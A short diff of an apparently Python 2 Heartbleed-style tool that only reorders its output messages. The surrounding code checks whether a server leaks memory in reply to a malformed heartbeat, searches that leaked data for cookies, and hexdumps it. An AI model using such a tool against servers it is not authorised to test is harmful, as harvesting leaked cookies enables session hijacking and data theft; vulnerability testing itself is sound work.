@@ -73,7 +73,6 @@ def hexdump(payload):
         hxdat = ' '.join('%02X' % ord(c) for c in line)
         pdat = ''.join((c if 32 <= ord(c) <= 126 else '.')for c in line)
         print '  %04x: %-48s %s' % (b, hxdat, pdat)
-    print
 
 
 def stream_to_hex_str(binary_stream):
@@ -217,19 +216,20 @@ class mySSL(object):
                 print 'Received heartbeat response:'
                 # self.parse_response()
                 if len(self.payload) > 3:
-                    hexdump(self.payload)
+                    print 'WARNING: server returned more data than it should - server is vulnerable!\n'
 
                     searchCookie(stream_to_str(self.payload))
 
-                    print 'WARNING: server returned more data than it should - server is vulnerable!'
+                    hexdump(self.payload)
                 else:
                     print 'Server processed malformed heartbeat, but did not return any extra data.'
                 return True
 
             if _type == 21:
                 print 'Received alert:'
+                print 'Server returned error, likely not vulnerable\n'
+
                 hexdump(self.payload)
-                print 'Server returned error, likely not vulnerable'
                 return False
 
     # def parse_response(self):
